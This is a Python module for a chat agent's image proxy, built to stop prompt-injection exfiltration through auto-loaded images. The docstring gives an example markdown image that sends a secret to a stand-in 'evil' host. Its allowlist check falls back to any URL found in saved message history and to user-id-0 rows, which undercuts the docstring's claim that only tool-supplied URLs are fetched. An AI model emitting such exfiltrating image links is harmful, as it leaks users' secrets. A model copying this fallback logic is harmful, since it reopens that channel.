"""Same-origin image proxy for the thumbnails a web search returned.

Chat answers show a picture next to each list item. Loading those straight from third-party hosts would tell
every host the user's IP and referrer, and an auto-loading <img> is also a classic prompt-injection exfiltration
channel (the model is tricked into emitting ![x](https://evil/?q=<secret>)). So the browser only ever loads
/media/proxy?u=..., and the server only fetches a URL that a tool result handed to THIS user a moment ago
(web_search / web_search_images call remember()). Anything else is refused, so a model-invented URL cannot be used
to reach a host or carry data. Fetches go through core.net_guard (public addresses only, every redirect hop
checked), are capped in size, must really be a raster image (magic bytes, no SVG) and send no cookies or referrer.
"""

import hashlib
import time
from collections import OrderedDict
from pathlib import Path
from typing import Optional
from urllib.parse import unquote, urlparse

from . import net_guard

ALLOW_TTL_S = 3600
ALLOW_MAX_PER_USER = 500
MAX_BYTES = 2 * 1024 * 1024          # what is sent to the browser
FETCH_BYTES = 8 * 1024 * 1024        # what may be downloaded: a big original is shrunk below
SHRINK_ABOVE = 1_500_000
SHRINK_TO_PX = 1200
FETCH_TIMEOUT_S = 8
CACHE_MAX_ITEMS = 64
CACHE_DIR = Path(__file__).resolve().parent.parent / ".image_cache"
_UA = "Mozilla/5.0 (compatible; LocalAgentImageProxy/1.0)"
# Wikimedia answers 403 to generic or browser-like agents; its policy asks API clients for a descriptive one
_WIKI_UA = "LocalAgentImageProxy/1.0 (self-hosted chat image proxy; https://github.com/)"


def _ua_for(url: str) -> str:
    host = (urlparse(url).hostname or "").lower()
    return _WIKI_UA if host.endswith((".wikimedia.org", ".wikipedia.org")) else _UA


def _cache_disk_path(url: str) -> tuple:
    h = hashlib.sha256(url.encode("utf-8")).hexdigest()
    d = CACHE_DIR / h[:2]
    return d / f"{h}.bin", d / f"{h}.meta"


def _get_disk_cache(url: str) -> Optional[tuple]:
    try:
        bin_p, meta_p = _cache_disk_path(url)
        if bin_p.is_file() and meta_p.is_file():
            ctype = meta_p.read_text(encoding="utf-8").strip()
            data = bin_p.read_bytes()
            if ctype and data:
                return ctype, data
    except Exception:
        pass
    return None


def _put_disk_cache(url: str, ctype: str, data: bytes) -> None:
    try:
        bin_p, meta_p = _cache_disk_path(url)
        bin_p.parent.mkdir(parents=True, exist_ok=True)
        bin_p.write_bytes(data)
        meta_p.write_text(ctype, encoding="utf-8")
    except Exception:
        pass


def _shrink(data: bytes, ctype: str) -> tuple:
    """A picture too big to send (a Commons original is often 5+ MB) is scaled down to a JPEG that fits; on any problem
    the bytes are returned as they are."""
    try:
        import io
        from PIL import Image
        img = Image.open(io.BytesIO(data))
        img.thumbnail((SHRINK_TO_PX, SHRINK_TO_PX))
        out = io.BytesIO()
        img.convert("RGB").save(out, "JPEG", quality=82, optimize=True)
        return "image/jpeg", out.getvalue()
    except Exception:
        return ctype, data

_allowed: dict = {}                 # user id -> OrderedDict[url -> expiry]
_cache: "OrderedDict[str, tuple]" = OrderedDict()   # url -> (content type, bytes)


class ProxyRefused(ValueError):
    """The URL may not be proxied; the message is safe to show."""


def remember(user_id: Optional[int], urls) -> None:
    """A tool result just gave this user these image URLs: they may be proxied for the next hour."""
    if not urls:
        return
    target_uid = user_id if user_id is not None else 0
    bucket = _allowed.setdefault(target_uid, OrderedDict())
    now = time.time()
    db_items = []
    for u in urls or []:
        u = str(u or "").strip()
        if u.lower().startswith("https://") and len(u) <= 2000:
            clean_u = u.split("?")[0]
            exp = now + ALLOW_TTL_S
            bucket.pop(u, None)
            bucket[u] = exp
            bucket.pop(clean_u, None)
            bucket[clean_u] = exp
            db_items.append((target_uid, u, clean_u, exp))

    while len(bucket) > ALLOW_MAX_PER_USER:
        bucket.popitem(last=False)

    if db_items:
        try:
            from .db.common import _get_projects_db
            db = _get_projects_db()
            for uid, u, clean_u, exp in db_items:
                db.execute(
                    "INSERT OR REPLACE INTO user_allowed_images (user_id, url, clean_url, expires_at) VALUES (?, ?, ?, ?)",
                    (uid, u, clean_u, exp)
                )
        except Exception:
            pass


def reset_for_testing() -> None:
    """Clear memory, test database rows, and disk cache (used by unit tests)."""
    _allowed.clear()
    _cache.clear()
    try:
        from .db.common import _get_projects_db
        db = _get_projects_db()
        db.execute("DELETE FROM user_allowed_images")
    except Exception:
        pass
    try:
        import shutil
        if CACHE_DIR.is_dir():
            shutil.rmtree(CACHE_DIR, ignore_errors=True)
    except Exception:
        pass


def is_allowed(user_id: Optional[int], url: str) -> bool:
    url = (url or "").strip()
    if not url.lower().startswith("https://"):
        return False

    clean_u = url.split("?")[0]
    unq_u = unquote(url)
    unq_clean = unquote(clean_u)
    now = time.time()

    # 1. Check in-memory allowed bucket for this user
    target_uid = user_id if user_id is not None else 0
    bucket = _allowed.get(target_uid)
    if bucket:
        # If explicitly recorded in RAM, RAM expiry is authoritative
        for k in (url, clean_u, unq_u, unq_clean):
            if k in bucket:
                return bucket[k] > now

    # 1b. Check in-memory fallback bucket (0 / None) if target_uid != 0
    if target_uid != 0:
        for b in (_allowed.get(0), _allowed.get(None)):
            if b:
                for k in (url, clean_u, unq_u, unq_clean):
                    if k in b:
                        return b[k] > now

    # 2. Check persistent user_allowed_images table in DB
    try:
        from .db.common import _get_projects_db
        db = _get_projects_db()
        candidates = [url, clean_u, unq_u, unq_clean]
        q_placeholders = ",".join("?" for _ in candidates)
        row = db.execute(
            f"SELECT expires_at FROM user_allowed_images "
            f"WHERE (user_id = ? OR user_id = 0) AND (url IN ({q_placeholders}) OR clean_url IN ({q_placeholders})) "
            f"ORDER BY expires_at DESC LIMIT 1",
            [target_uid, *candidates, *candidates]
        ).fetchone()
        if row and (row["expires_at"] > now or row["expires_at"] == 0):
            return True
    except Exception:
        pass

    # 3. Check if this URL is part of a message in the user's saved session history
    try:
        from .db.common import _get_projects_db
        db = _get_projects_db()
        search_key = clean_u.replace("%", "").replace("_", "")
        if len(search_key) > 15:
            row = db.execute(
                "SELECT 1 FROM messages m JOIN sessions s ON m.session_id = s.id "
                "WHERE (s.user_id = ? OR ? = 0) AND m.content LIKE ? LIMIT 1",
                (target_uid, target_uid, f"%{clean_u}%")
            ).fetchone()
            if row:
                remember(user_id, [url, clean_u])
                return True
    except Exception:
        pass

    return False


def sniff(data: bytes) -> str:
    """Content type from the first bytes, '' when it is not png / jpeg / gif / webp."""
    if data.startswith(b"\x89PNG\r\n\x1a\n"):
        return "image/png"
    if data.startswith(b"\xff\xd8\xff"):
        return "image/jpeg"
    if data[:6] in (b"GIF87a", b"GIF89a"):
        return "image/gif"
    if data[:4] == b"RIFF" and data[8:12] == b"WEBP":
        return "image/webp"
    return ""


def fetch(user_id: Optional[int], url: str, allow_trusted: bool = False) -> tuple:
    """(content type, bytes) for an allowed URL. Blocking: call it from a worker thread."""
    url = (url or "").strip()
    if not url.lower().startswith("https://"):
        raise ProxyRefused("only https images")
    if not allow_trusted and not is_allowed(user_id, url):
        raise ProxyRefused("this image did not come from a search result")

    hit = _cache.get(url)
    if hit:
        _cache.move_to_end(url)
        return hit

    disk_hit = _get_disk_cache(url) or _get_disk_cache(url.split("?")[0])
    if disk_hit:
        _cache[url] = disk_hit
        return disk_hit

    try:
        r = net_guard.guarded_get(url, FETCH_TIMEOUT_S, headers={"User-Agent": _ua_for(url), "Accept": "image/*"},
                                  max_bytes=FETCH_BYTES)
    except net_guard.BlockedURLError as e:
        raise ProxyRefused(str(e))
    except Exception:
        raise ProxyRefused("image could not be loaded")
    if r.status_code != 200 or r.truncated or not r.content:
        raise ProxyRefused("image could not be loaded")
    ctype = sniff(r.content)
    if not ctype:
        raise ProxyRefused("not a supported image")
    data = r.content
    if len(data) > SHRINK_ABOVE:
        ctype, data = _shrink(data, ctype)
    if len(data) > MAX_BYTES:
        raise ProxyRefused("image is too large")

    _cache[url] = (ctype, data)
    _put_disk_cache(url, ctype, data)
    while len(_cache) > CACHE_MAX_ITEMS:
        _cache.popitem(last=False)
    return ctype, data
